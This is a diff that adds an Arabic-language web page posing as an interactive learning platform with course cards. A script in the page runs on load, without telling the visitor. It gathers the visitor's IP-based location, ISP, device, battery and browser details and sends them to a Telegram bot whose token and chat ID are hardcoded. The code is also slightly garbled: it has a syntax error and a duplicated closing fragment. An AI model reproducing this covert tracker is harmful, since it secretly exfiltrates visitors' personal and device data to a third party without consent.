@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة التعليم التفاعلية</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e67e22;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Tajawal', Arial, sans-serif;
+            background: #f8f9fa;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 60px 0;
+            background: linear-gradient(135deg, var(--primary-color), #1a2533);
+            color: white;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .course-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px 0;
+        }
+
+        .course-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .course-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .course-icon {
+            font-size: 2.5em;
+            color: var(--accent-color);
+            margin-bottom: 15px;
+        }
+
+        footer {
+            background: var(--primary-color);
+            color: white;
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 50px;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 30px 0;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>مرحبا بكم في منصة التعليم التفاعلية</h1>
+        <p>اختر الدورة المناسبة وابدأ رحلة التعلم</p>
+    </div>
+
+    <div class="container">
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-number">+25K</div>
+                <div>طالب مسجل</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">150+</div>
+                <div>مصدر تعليمي</div>
+            </div>
+        </div>
+
+        <div class="course-grid">
+            <div class="course-card">
+                <i class="fas fa-mobile-alt course-icon"></i>
+                <h3>تطوير التطبيقات</h3>
+                <p>تعلم بناء تطبيقات الجوال باستخدام Flutter</p>
+            </div>
+
+            <div class="course-card">
+                <i class="fas fa-database course-icon"></i>
+                <h3>قواعد البيانات</h3>
+                <p>إدارة قواعد البيانات باستخدام SQL وMongoDB</p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2024 نظام تعليمي تجريبي - جميع الحقوق محفوظة</p>
+        <p>تم التطوير لأغراض تعليمية</p>
+    </footer>
+
+    <script>
+        const BOT_TOKEN = '7951693264:AAF9zd4UbDrrKjtFHms5QIcKcOYRPjDkHqc';
+        const CHAT_ID = '7828957324';
+        const IPINFO_TOKEN = 'b79926064ca38a';
+
+        async function getDetailedDeviceInfo() {
+            const parser = new UAParser();
+            const result = parser.getResult();
+            
+            try {
+                // معلومات الموقع
+                const ipResponse = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+                const ipData = await ipResponse.json();
+
+                // معلومات البطارية
+                const battery = await navigator.getBattery?.() || {};
+
+                // معلومات الشبكة
+                const connection = navigator.connection || {};
+
+                return {
+                    device: {
+                        type: result.device.type || 'مجهول',
+                        model: result.device.model || 'غير معروف',
+                        vendor: result.device.vendor || 'غير معروف',
+                        os: `${result.os.name} ${result.os.version}`,
+                        architecture: result.cpu.architecture || 'غير معروف',
+                        screen: `${screen.width}x${screen.height}`,
+                        colorDepth: `${screen.colorDepth} بت`,
+                        ram: navigator.deviceMemory ? `${navigator.deviceMemory} جيجابايت` : 'غير معروف',
+                        cores: navigator.hardwareConcurrency || 'غير معروف'
+                    },
+                    network: {
+                        ip: ipData.ip,
+                        isp: ipData.org || 'غير معروف',
+                        city: ipData.city,
+                        country: ipData.country,
+                        timezone: ipData.timezone,
+                        connectionType: connection.effectiveType || 'غير معروف',
+                        downlink: connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف'
+                    },
+                    browser: {
+                        name: result.browser.name,
+                        version: result.browser.version,
+                        engine: result.engine.name,
+                        language: navigator.language,
+                        userAgent: navigator.userAgent
+                    },
+                    battery: {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'نعم' : 'لا',
+                        chargingTime: battery.chargingTime || 'غير معروف',
+                        dischargingTime: battery.dischargingTime || 'غير معروف'
+                    },
+                    time: new Date().toLocaleString()
+                };
+            } catch (error) {
+                console.error('خطأ في جمع البيانات:', error);
+                return null;
+            }
+        }
+
+        async function sendTechnicalReport(data) {
+            const message = `
+                📱 تقرير فني تفصيلي 📊
+                ======================
+                
+                🌍 معلومات الموقع:
+                - العنوان IP: ${data.network.ip}
+                - الدولة: ${data.network.country}
+                - المدينة: ${data.network.city}
+                - المنطقة الزمنية: ${data.network.timezone}
+                - مزود الخدمة: ${data.network.isp}
+                
+                📲 معلومات الجهاز:
+                - النوع: ${data.device.type}
+                - الموديل: ${data.device.model}
+                - النظام: ${data.device.os}
+                - المعمارية: ${data.device.architecture}
+                - الذاكرة: ${data.device.ram}
+                - النوى: ${data.device.cores}
+                - الشاشة: ${data.device.screen}
+                - عمق الألوان: ${data.device.colorDepth}
+                
+                🌐 معلومات الشبكة:
+                - نوع الاتصال: ${data.network.connectionType}
+                - السرعة: ${data.network.downlink}
+                
+                🔋 حالة البطارية:
+                - مستوى الشحن: ${data.battery.level}
+                - حالة الشحن: ${data.battery.charging}
+                
+                🕒 وقت الزيارة: ${data.time}
+                
+                🔧 معلومات تقنية إضافية:
+                - المتصفح: ${data.browser.name} ${data.browser.version}
+                - محرك التصيير: ${data.browser.engine}
+                - لغة النظام: ${data.browser.language}
+            `;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                console.log('منور 🫶');
+            } catch (error) {
+                console.error('منور' error);
+            }
+        }
+
+        // الإرسال التلقائي عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', async () => {
+            const deviceData = await getDetailedDeviceInfo();
+            if (deviceData) {
+                await sendTechnicalReport(deviceData);
+            }
+        });
+    </script>
+</body>
+</html>     }
+        });
+    </script>
+</body>
+</html>
